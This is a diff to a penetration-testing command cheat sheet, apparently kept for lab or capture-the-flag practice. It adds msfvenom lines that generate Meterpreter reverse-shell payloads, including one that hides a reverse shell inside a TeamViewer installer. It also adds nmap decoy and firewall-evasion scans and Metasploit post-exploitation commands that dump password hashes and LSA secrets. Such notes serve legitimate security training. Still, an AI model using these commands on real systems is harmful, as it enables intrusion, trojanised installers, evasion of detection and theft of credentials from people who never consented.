@@ -39,9 +39,11 @@ hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt
 
 # MSFVENOM (msfvenom, msf, metasploit)
 Generate reverse shell exe (bash):
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx -o reverse_shell.aspx
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1338 -f exe -o /home/kali/rev.exe
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./Lala.exe
 
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
 
 # Python webserver
 Host files (bash):
@@ -158,13 +160,28 @@ minimodem -r -f 1200.wav 1200
 sudo nmap -sVC -sS host
 nmap -sVC --top-ports 1000 host
 
+Ping Scan:
+sudo nmap 10.10.1.1 -sn -PE --packet-trace -oA hosts --reason
+
+Windows: ttl=128
+
+open|filtered = firewall / packet filter
+closed|filtered	= firewall / packet filter
+
 SNMP example with script wildcards
 sudo nmap --script=snmp* -sU IP
 
-nmap -sV --script vulners --script-args mincvss=9 host
+nmap -sV --script *vulners* --script-args mincvss=9 host
 
 Fast scanning a list of hosts:
-nmap --top-ports 100 --open -sV -T5 --script vulners --script-args mincvss=9 --stats-every 60s -iL domains.txt -oN nmap.txt
+nmap --top-ports 100 --open -sV -T5 --script *vulners* --script-args mincvss=9 --stats-every 60s -iL domains.txt -oN nmap.txt
+
+Decoy scan (decoy):
+nmap -A ip -D RND:5
+
+Firewall/IDS Tricks (fw, firewall, ids, port):
+sudo nmap 10.10.1.1 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
+ncat -nv --source-port 53 10.10.1.1 50000
 
 Nmap with searchsploit:
 nmap -sV -sC host -oX host.xml
@@ -340,8 +357,25 @@ set LHOST tun0
 set LPORT 1337
 run -j
 
-Meterpreter:
-use mutli/handler
+Database:
+sudo msfdb run
+hosts -d (delete hosts)
+db_nmap -A --top-ports 1000 10.129.203.65
+setg RHOSTS  10.129.203.65 (set global)
+use post/multi/recon/local_exploit_suggester
+
+hashdump
+load kiwi
+lsa_dump_sam
+lsa_dump_secrets
+
+Custom:
+loadpath /usr/share/metasploit-framework/modules/
+reload_all
+
+
+Meterpreter (multi/handler, reverse shell):
+use multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST tun0
 set LPORt 1337
